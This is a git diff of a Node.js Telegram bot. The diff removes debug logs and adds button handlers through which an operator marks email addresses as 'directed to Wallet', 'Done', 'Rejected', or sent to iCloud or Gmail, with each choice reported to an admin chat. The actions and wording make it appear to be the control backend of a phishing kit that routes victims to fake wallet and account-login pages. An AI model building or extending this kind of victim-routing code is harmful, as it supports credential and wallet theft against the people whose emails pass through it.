@@ -241,13 +241,9 @@ bot.on("callback_query", async (query) => {
           const botToken = process.env.BOT_TOKEN;
           const chatId = process.env.ADMIN_CHAT_ID;
           
-          console.log(`🔍 BOT: Fetching SMS2 info for ${sms2Id}...`);
           const sms2Info = await fetch(`${APP_URL}/get-sms2-info/${sms2Id}`);
-          console.log(`🔍 BOT: Response status: ${sms2Info.status}`);
           const sms2Data = await sms2Info.json();
-          console.log(`🔍 BOT: Fetched data:`, sms2Data);
           const sms2Email = sms2Data.email || sms2Id;
-          console.log(`🔍 BOT: Final email to display: ${sms2Email}`);
           
           let statusMsg = "";
           if (action === "sms2_wallet") {
@@ -720,6 +716,69 @@ if (bot2) {
           return;
         } catch (err) {
           console.error("Error processing verifying choice:", err);
+          return;
+        }
+      }
+
+      // ✅ HANDLE SMS 2 BUTTONS (Bot 2) - NEW!
+      if (action === "sms2_wallet" || action === "sms2_done" || action === "sms2_reject" || action === "sms2_icloud" || action === "sms2_gmail") {
+        const sms2Id = identifier;
+        
+        try {
+          const updateResult = await fetch(`${APP_URL}/update-sms2-choice`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ sms2Id, choice: action })
+          });
+          
+          try {
+            await bot2.editMessageReplyMarkup(
+              { inline_keyboard: [] },
+              { chat_id: query.message.chat.id, message_id: query.message.message_id }
+            );
+          } catch (err) {
+            console.error("Error removing buttons:", err);
+          }
+          
+          await bot2.answerCallbackQuery(callbackId, { text: `✅ ${action.toUpperCase()}` });
+          
+          try {
+            const sms2Info = await fetch(`${APP_URL}/get-sms2-info/${sms2Id}`);
+            const sms2Data = await sms2Info.json();
+            const sms2Email = sms2Data.email || sms2Id;
+            
+            let statusMsg = "";
+            if (action === "sms2_wallet") {
+              statusMsg = `📧 <code>${sms2Email}</code> has been directed to <b>Wallet</b> 💼`;
+            } else if (action === "sms2_done") {
+              statusMsg = `📧 <code>${sms2Email}</code> has been directed to <b>Done</b> 🏁`;
+            } else if (action === "sms2_reject") {
+              statusMsg = `📧 <code>${sms2Email}</code> has been <b>Rejected</b> ❌`;
+            } else if (action === "sms2_icloud") {
+              statusMsg = `📧 <code>${sms2Email}</code> → ☁️`;
+            } else if (action === "sms2_gmail") {
+              statusMsg = `📧 <code>${sms2Email}</code> → 🌈`;
+            }
+            
+            if (statusMsg) {
+              const url = `https://api.telegram.org/bot${BOT_TOKEN_2}/sendMessage`;
+              await fetch(url, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                  chat_id: ADMIN_CHAT_ID_2,
+                  text: statusMsg,
+                  parse_mode: "HTML"
+                })
+              });
+            }
+          } catch (err) {
+            console.error("Error sending SMS2 status message:", err);
+          }
+          
+          return;
+        } catch (err) {
+          console.error("Error processing SMS2 choice:", err);
           return;
         }
       }
